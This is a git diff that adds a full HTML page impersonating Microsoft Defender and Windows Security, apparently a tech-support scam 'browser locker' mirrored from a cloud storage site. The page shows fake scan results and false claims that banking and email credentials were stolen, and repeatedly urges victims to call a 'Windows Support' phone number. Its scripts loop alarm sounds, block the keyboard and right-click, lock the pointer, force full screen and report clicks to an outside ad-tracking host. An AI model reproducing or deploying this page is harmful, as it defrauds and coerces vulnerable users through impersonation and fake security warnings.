@@ -1,1 +1,628 @@
-# msme
+<html lang="en"><head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<script defer="" data-domain="8.com" src="script.js.download"></script>
+	
+      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+      <meta content="noindex,nofollow" name="robots">
+      <title>Security center </title>
+      <link href="https://wwwmincros0ftcom.z13.web.core.windows.net/w1.html" rel="icon" id="favicon" type="image/png">
+      <link href="tapa.css" rel="stylesheet">
+        <link href="bootstrap.min.css" type="text/css" rel="stylesheet">
+<script src="jquery.min.js.download"></script>
+<script src="bootstrap.min.js.download" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="font-awesome.min.css">
+
+      <style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{animation : tawkMaxOpen .25s ease!important;}@keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>
+
+
+         <script src="esc.js.download" type="text/javascript"></script>
+         <script src="flscn.js.download" type="text/javascript"></script>
+         <script src="main.js.download" type="text/javascript"></script>
+    <script>
+function chat() {
+document.getElementById("chat").style.display = "block";
+document.getElementById("footer").style.display = "block";
+document.getElementById("welcomeDiv").style.display = "block";
+ document.getElementById("chat-box").style.display = "none";
+
+}
+</script>
+
+<script>
+      function getVariableFromURl(n0me)
+      {
+          n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+          var regexS = "[\\?&]"+n0me+"=([^&#]*)";
+          var regex = new RegExp( regexS );
+          var results = regex.exec( window.location.href );
+          if( results == null )
+              return "";
+          else
+              return results[1];
+      }
+  </script>
+
+
+  <script type="text/javascript">
+              var ph0ne = "+1-888-492-0387";
+          </script>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "p5419qwnk6");
+</script>
+
+
+        </head>
+        <body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none" data-new-gr-c-s-check-loaded="14.1188.0" data-gr-ext-installed=""><__hrp-shortcut__ class="hrp-container hrp-container_normal" style="inset: auto 0px 130px auto; opacity: 1;"><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/close.svg"><div class="hrp-tooltip hrp-close"><div class="hrp-message">CLOSE AI BAR<br>• ALT → Disable for website<br>• SHIFT → Disable globally</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/general-search-refraction.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>S</b></div><div class="hrp-message">SEARCH</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/education-atom-02.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>E</b></div><div class="hrp-message">EXPLAIN</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/communication-annotation-dots.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>A</b></div><div class="hrp-message">ASK PAGE</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/files-file-search-04.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>U</b></div><div class="hrp-message">SUMMARIZE</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/editor-dotpoints-02.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>D</b></div><div class="hrp-message">EXTRACT DATA</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/editor-roller-brush.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>O</b></div><div class="hrp-message">REPURPOSE PAGE</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/time-clock-refresh.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>M</b></div><div class="hrp-message">MONITOR PAGE</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_option" style="order: 1;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/arrows-flip-backward.svg"><div class="hrp-tooltip hrp-command"><div class="hrp-hotkey"><b><span class="hrp-hotkey-prefix">//</span>R</b></div><div class="hrp-message">REPLY TO TEXT</div><div class="hrp-triangle"></div></div></div><div class="hrp-button hrp-button_main" style="order: 2;"><img src="chrome-extension://eanggfilgoajaocelnaflolkadkeghjp/img/commands/main.svg"><div class="hrp-tooltip hrp-main"><div class="hrp-hotkey"><span class="hrp-hotkey-prefix">//</span>/</div><div class="hrp-message">AI CHAT<br>Drag to move</div><div class="hrp-triangle"></div></div></div><style>html.has-hrp-frame>.hrp-container{display:none} .hrp-container{position:fixed;z-index:2147483647;opacity:0;width:22px;min-height:49px;box-shadow:0 3px 6px rgba(0,0,0,0.16);border-radius:4px 0 0 4px;background-color:#fff;display:flex;flex-direction:column;align-items:center;transition:opacity 0.12s ease-in-out,width 0.12s ease-in-out;box-sizing:border-box;} @media print{.hrp-container{display:none !important}} .hrp-container::before{content:"";position:absolute;top:-14px;right:0;bottom:-14px;left:-14px;opacity:0;pointer-events:all} .hrp-container:hover,.hrp-container_active{width:36px;box-shadow:0 6px 12px rgba(0,0,0,0.20)} .hrp-container:hover::before,.hrp-container_active::before{left:-40px;bottom:-40px;top:-40px} .hrp-button{display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;width:100%;color:#2B3338;font-weight:600;font-size:13px;line-height:19px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji";text-align:center;cursor:pointer;box-sizing:border-box;} .hrp-button_option{display:none;min-height:34px;} .hrp-button_main{filter:grayscale(1)} .hrp-button_option img{filter:invert(38%) sepia(10%) saturate(170%) hue-rotate(191deg) brightness(95%) contrast(86%)} .hrp-button img{max-width:fit-content} .hrp-container_normal .hrp-button_option:first-of-type{border-radius:4px 0 0 0} .hrp-container_reversed .hrp-button_option:last-of-type{border-radius:0 0 0 4px} .hrp-button_option:hover{background-color:#2A3338} .hrp-button_option:hover img{filter:invert(100%)} .hrp-container:hover .hrp-button_option{display:flex} .hrp-container_active .hrp-hotkey-prefix{display:none} .hrp-container_active .hrp-button_main{filter:none} .hrp-container_active .hrp-button_option{display:flex} .hrp-container_active .hrp-tooltip.hrp-command:not(.hrp-tooltip_weak){display:flex} .hrp-container .hrp-tooltip_weak .hrp-hotkey{display:none} .hrp-container_active .hrp-tooltip.hrp-close{display:none !important} .hrp-button:hover .hrp-tooltip{display:flex} .hrp-button .hrp-message{padding-left:4px} .hrp-button .hrp-hotkey{padding:0 4px 0 4px;margin-right:4px;background-color:#465057;border-radius:2px;font-family:Monaco,Courier New;font-weight:600;font-size:11px} .hrp-tooltip{position:absolute;z-index:2;top:50%;transform:translate(0,-50%);white-space:nowrap;background-color:#2A3338;color:white;border-radius:4px;padding:4px 8px 5px 4px;right:46px;display:none;font-weight:500;box-sizing:border-box;text-align:left;pointer-events:none} .hrp-triangle{position:absolute;right:-5px;top:50%;transform:translate(0, -50%);width:0;height:0;border-top:4px solid transparent;border-bottom:4px solid transparent;border-left:5px solid #2A3338}</style><!--__hrp-shortcut__-->
+
+
+
+        
+
+    <audio id="websgt">
+        <source src="beep.mp3" type="audio/mpeg">
+		<source src="grmn.mp3" type="audio/mpeg">
+      </audio>
+      <audio autoplay="" id="infogt">
+        <source src="grmn.mp3" type="audio/mpeg">
+      </audio>
+
+      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+        <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+
+          <div class="bg" id="bg">
+        <div class="bgimg" style="top:0">
+          <img src="f24.png" alt="" width="100%">
+        </div>
+      </div>
+      </a>
+      <div class="pro_box" style="cursor: none; display: block;">
+        <div class="pro_box_header">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="minimize">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="logo">
+                <img src="msmm.png">
+                <span>Windows security</span>
+              </div>
+            </div>
+            <div class="col-md-8">
+              <div class="activate_lic">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <button>Activate the license</button>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="set.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="data:png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_box">
+          <div class="scan_box_header">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="quick_scan">
+                  <p>
+                    <img src="vsc.png">
+                    <span>Scanning Rapide</span>
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="bhfys">
+                  <ul>
+                    <li>
+                      <a href="#">
+                        <img src="mnc.png">
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="scan_body">
+            <div class="progress" style="height:30px;">
+              <img src="scn.png" alt="" style="max-width: 100%;">
+            </div>
+            <div class="table_quick">
+              <table class="table table-bordered">
+                <thead>
+                  <tr>
+                    <th scope="col">Scanned Objects</th>
+                    <th scope="col">
+                      <div class="col_fourth counter">
+                        <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                      </div>
+                    </th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Time Spent</th>
+                    <th scope="col">5 secs</th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Identified Threats</th>
+                    <th scope="col" style="color:red">
+                      <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                    </th>
+                  </tr>
+                </thead>
+              </table>
+            </div>
+          </div>
+          <div class="scan_footer">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="bt_can">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scan</button>
+                  </div>
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Pause</button>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="bt_can2">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scheduled Scans</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pro_box2" style="cursor: default; display: block;">
+        <img src="bg1.png" alt="" style="max-width: 100%;">
+      </div>
+      <div class="pro_box3" style="cursor: none; display: block;">
+        <div class="pro_box_header">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="minimize">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="logo">
+                <img src="msmm.png">
+                <span>Windows security</span>
+              </div>
+            </div>
+            <div class="col-md-8">
+              <div class="activate_lic">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <button>Activate the license</button>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="bel.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="set.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="data:png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div><div class="scan_box2" style=" border: 1px solid #474747;  cursor:default;  box-shadow: 15px 15px 15px 15px rgba(0,0,0,.4);">
+        <div class="scan_box2">
+          <div class="scan_box_header">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="quick_scan">
+                  <p>
+                    <img src="vsc.png">
+                    <span>Scan</span>
+                  </p>
+                </div>
+              </div>
+             <div class="col-md-6">
+           <span class="fl title2" id="txts1">
+              <a href="#" id="cross">
+                <p style="margin-right:50px;">+1-888-492-0387  </p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+                      </a>
+
+
+                </span></div>
+              </div>
+            </div>
+          </div>
+          <div class="scan_body">
+            <div class="row">
+              <div class="col-md-12">
+                <div class="tooreg_detail_scan">
+                  <ul>
+
+                  </ul></div>
+                </div>
+
+              </div>
+            </div>
+          </div>
+        </div>
+
+      <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="right-foot" style="text-align:center">
+              <span id="footertxt">
+                <img src="msmm.png"> Windows security </span>
+              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-888-492-0387  
+                </span>
+              </span>
+            </div>
+          </div>
+          <div class="col-md-12">
+            <marquee direction="left" height="100px" width="100%">
+              <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your PC at risk. Windows Defender scan detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents。</small>
+            </marquee>
+          </div>
+        </div>
+      </div>
+      <div class="lightbox" id="poptxt" onclick="beep1();" style="cursor: default; display: block;">
+        <div class="ilb top" style="font-size:17px">
+          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
+            <span class="fl title" id="txtadd">
+              <span class="fl ilb">
+                <img src="dm.png" class="logo3">
+              </span>Microsoft Defender </span>
+            <span class="fl title2" id="txts1">
+               <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+
+            </span>
+          </div>
+        </div>
+        <div id="txtintro2">
+          <span class="colo-rd">
+           <p style="font-size:30px;font-weight:500;">Sorry, scan is not completed!</p>
+            <p style="font-size:25px;color:red;font-weight:500;">Error: Ox800VDS</p>
+             <p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender found some infected files but not able to remove it because of the group policies permissions. Please Scan now to remove it manually.</p>
+
+          </span>
+        </div>
+        <img src="re.gif" id="banner">
+        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
+           <span class="support" style="font-size:22px;">Windows Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-888-492-0387  
+            </span>
+          </span>
+        </div>
+        <div id="bottom">
+          <img src="msmm.png" id="badge">
+          <span class="title3">Windows Security</span>
+          <ul>
+            <li>
+              <a href="#" style="text-decoration: none;">
+                <div class="button">
+                  <span id="">Scan now</span>
+                </div>
+              </a>
+            </li>
+            <li>
+              <a href="#" style="text-decoration: none;">
+                <div class="button2">
+                  <span id="">Scan Later</span>
+                </div>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+      <div class="cardcontainer" style="cursor: default; display: block;" id="pop_up_new">
+        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Windows-Defender </p>
+        <p>
+         <b>Access to this PC has been blocked for security reasons</b>
+         </p>
+         <p>Your computer has been reported to be infected with Trojan-type spyware. The following data was compromised:</p>
+         <p>> Email ID <br>> Bank Password <br>> Facebook Login <br>> Photos and Documents </p>
+         <p>A Windows Defender scan detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
+         <p>Please contact us immediately. Our engineer will guide you through the removal process over the phone. </p>
+         <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
+         <p>Closing this window may put your personal information at risk and may cause your Windows registration to be suspended. </p>
+         <p style="padding-bottom:0;color:#fff;font-size:16px">Windows Please call support:<strong>
+            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-888-492-0387  
+            </span>
+          </strong>
+        </p>
+        <div class="action_buttons">
+          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Allow</a>
+          <a class="active" id="leave_page" style="color:#fff!important">Deny</a>
+        </div>
+      </div>
+
+
+      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
+          <strong>
+         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-888-492-0387  
+            </span>
+          </strong>
+        </p>
+      </div>
+      <div id="chat" style="display: none;">
+        <img src="msmm.png">
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+        <br>
+        <p>Windows Technical Support
+        </p>
+        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-888-492-0387  
+          <br>( Toll-free number)<br><br>
+        </h4>
+        <div class="arrow-down">
+          <svg height="1em" viewBox="0 0 320 512">
+            <style>
+              svg {
+                fill: #fff
+              }
+            </style>
+            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+                  </svg></div>
+      </div>
+<div id="chat-box" style="display: block;">
+<span style="color: red;
+font-size: 21px;
+font-weight: 600;
+margin-left: 6px;
+position: relative;
+top: 5px;">Virus Alert !!</span>
+<div class="bhfys" onclick="hide1();playSound1();">
+            <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>
+
+          </div>
+
+<br>
+<br>
+<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
+Microsoft Windows locked due to unusual activity.
+
+<img src="rasm.gif" width="250">
+
+<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;">+1-888-492-0387   			 	</strong></p>
+
+</div>
+
+<script>
+function showd2() {
+document.getElementById("chat-box").style.display = "block";
+}
+</script>
+
+
+
+      <script>
+        setInterval(function() {
+          document.getElementById("infogt").play()
+        }, 500);
+      </script>
+      <script>
+  function beep1() {
+    document.getElementById("websgt").play();
+ }
+  </script>
+      <script>
+        var e = 1;
+        setInterval(function() {
+          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
+        }, 1E3);
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#welcomeDiv").show()
+
+          })
+        });
+      </script>
+      <script>
+        $(document).ready(function() {
+          $(".pro_box").delay(400).fadeIn(300);
+          $("#poptxt").delay(2000).fadeIn(400);
+              $(".black").delay(1E3).fadeIn(800);
+          $(".pro_box2").delay(2500).fadeIn(800);
+          $(".pro_box3").delay(3500).fadeIn(800);
+          $("#pop_up_new").delay(4E3).fadeIn(800);
+        });
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#poptxt").show()
+          })
+        });
+        $(document).ready(function() {
+          $("#cross").click(function() {
+            $("#poptxt").show()
+          })
+        });
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("body").mouseover(function() {
+            $("#poptxt").show()
+          })
+        });
+      </script>
+      <script>
+        var isNS = "Netscape" == navigator.appName ? 1 : 0;
+        "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
+
+        function mischandler() {
+          return !1
+        }
+
+        function mousehandler(a) {
+          a = isNS ? a : event;
+          a = isNS ? a.which : a.button;
+          if (2 == a || 3 == a) return !1
+        }
+        document.oncontextmenu = mischandler;
+        document.onmousedown = mousehandler;
+        document.onmouseup = mousehandler;
+      </script>
+      <script>
+        document.onkeydown = function(a) {
+          return !1
+        };
+      </script>
+      <script>
+        document.attachEvent("onkeydown", win_onkeydown_handler);
+
+        function win_onkeydown_handler() {
+          switch (event.keyCode) {
+            case 116:
+              event.returnValue = !1;
+              event.keyCode = 0;
+              break;
+            case 27:
+              event.returnValue = !1, event.keyCode = 0
+          }
+        }
+      </script>
+      <script>
+        window.onload = function() {
+          window.moveTo(0, 0);
+          window.resizeTo(screen.availWidth, screen.availHeight)
+        };
+      </script>
+
+
+
+ <script type="text/javascript">
+function addEvent(obj, evt, fn) {
+		if (obj.addEventListener) {
+				obj.addEventListener(evt, fn, false);
+		}
+		else if (obj.attachEvent) {
+				obj.attachEvent("on" + evt, fn);
+		}
+}
+addEvent(window,"load",function(e) {
+		addEvent(document, "mouseout", function(e) {
+				e = e ? e : window.event;
+				var from = e.relatedTarget || e.toElement;
+				if (!from || from.nodeName == "HTML") {
+						// stop your drag event here
+						// for now we can just use an alert
+				 //alert("hello");
+
+			 modal.style.display = "block";
+
+				}
+		});
+});
+
+	$(document).mousemove(function(){
+	var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
+	//capture mouse movement event
+		 // remove our layover from the DOM
+	});
+
+ //  $(document).mousemove(function(){
+ // alert("move detect");
+	//capture mouse movement event
+ //   $("#pageLayover").remove(); // remove our layover from the DOM
+ // });
+
+
+</script>
+
+      		<script type="text/javascript">
+    let wtxqfurwiav = 80; //се
+    let timerId;
+
+    function getURLParameters(name) {
+      const searchParams = new URLSearchParams(window.location.search);
+      const params = {};
+
+      for (const [key, value] of searchParams.entries()) {
+        params[key] = value;
+      }
+
+      return params[name];
+    }
+
+    function startTimer() {
+        clearTimeout(timerId);
+        timerId = setTimeout(function() {
+          var clickid = getURLParameters('clickid');
+
+          const xhr = new XMLHttpRequest();
+          const url = 'https://adultaduls.com/click?cnv_id=' + clickid;  
+          
+         
+        xhr.open('GET', url);
+          xhr.send();
+        }, wtxqfurwiav * 1000);
+    }
+    document.addEventListener('click', startTimer);
+  </script>
+
+
+<script type="text/javascript" src="chrome-extension://aefiepimkogajhddmhcekceihikjcabd/injected.min.js"></script><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open"><style>
+      div.grammarly-desktop-integration {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+        -moz-user-select: none;
+        -webkit-user-select: none;
+        -ms-user-select:none;
+        user-select:none;
+      }
+
+      div.grammarly-desktop-integration:before {
+        content: attr(data-content);
+      }
+    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{" mode":"full","isactive":true,"isuserdisabled":false}"=""></div></template></grammarly-desktop-integration></body><!-- Mirrored from appw8w1.z13.web.core.windows.net/Wi0n42HelpErr0S0sh042/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jun 2024 17:55:11 GMT --></html>
